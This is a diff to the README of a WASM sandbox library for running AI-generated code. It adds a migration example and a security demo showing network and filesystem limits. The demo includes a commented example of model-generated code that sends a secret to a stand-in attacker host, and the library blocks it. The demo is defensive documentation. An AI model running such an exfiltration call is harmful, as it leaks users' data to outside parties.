@@ -32,6 +32,31 @@ Use the WASM kernel when "model wrote a snippet to do math / parse JSON / try
 something" is the workload. Use E2B/Blaxel when you need full POSIX, native
 binaries, or untrusted multi-tenant isolation.
 
+## Before / After
+
+Replacing an E2B / Docker code-exec tool with a wasmagent WASM kernel:
+
+```diff
+-import { tool } from "ai";
+-
+-const execTool = tool({
+-  description: "Run arbitrary JavaScript code",
+-  parameters: z.object({ code: z.string() }),
+-  execute: async ({ code }) => dockerExec(code),   // ← needs a server
+-});
++import { sandboxedJsTool } from "@wasmagent/aisdk";
++import { QuickJSKernel } from "@wasmagent/kernel-quickjs";
++
++const execTool = sandboxedJsTool({
++  kernel: new QuickJSKernel(),                      // ← in-process, edge-safe
++  capabilities: { allowedHosts: ["api.example.com"] },
++});
+```
+
+That's the entire migration. No Docker daemon, no E2B account, no server hop.
+The `CapabilityManifest` replaces container-level network/fs policies with
+one declarative object that travels with the tool.
+
 ## Install
 
 ```bash
@@ -118,6 +143,34 @@ into the same `kernel:` slot and the rest of your code is unchanged:
 | `RemoteSandboxKernel` (`/kernel-remote`) | Need full POSIX, native binaries, multi-tenant trust. Backed by E2B / Cloudflare Sandbox. | n/a |
 
 Swap is a one-liner — `kernel: new QuickJSKernel()` becomes `kernel: new PyodideKernel()`. Same `CapabilityManifest`, same tool-call shape, same SDK loop.
+
+## Security demo
+
+`CapabilityManifest` enforces network and filesystem policy at the kernel
+boundary — the model cannot escape it regardless of what code it generates:
+
+```ts
+import { sandboxedJsTool } from "@wasmagent/aisdk";
+import { QuickJSKernel } from "@wasmagent/kernel-quickjs";
+
+const kernel = new QuickJSKernel();
+const tool = sandboxedJsTool({
+  kernel,
+  capabilities: {
+    allowedHosts: [],           // no outbound network
+    allowedPaths: [],           // no filesystem access
+    cpuMs: 5_000,
+    memoryLimitBytes: 64 * 1024 * 1024,
+  },
+});
+
+// Model-generated code that tries to exfiltrate data:
+// fetch("https://attacker.example/exfil?data=secret")
+// → throws: network access denied — host "attacker.example" not in allowedHosts
+```
+
+Set `allowedHosts: ["api.example.com"]` to allow exactly one origin;
+glob patterns (`"*.example.com"`) are supported.
 
 ## Capability manifest
 
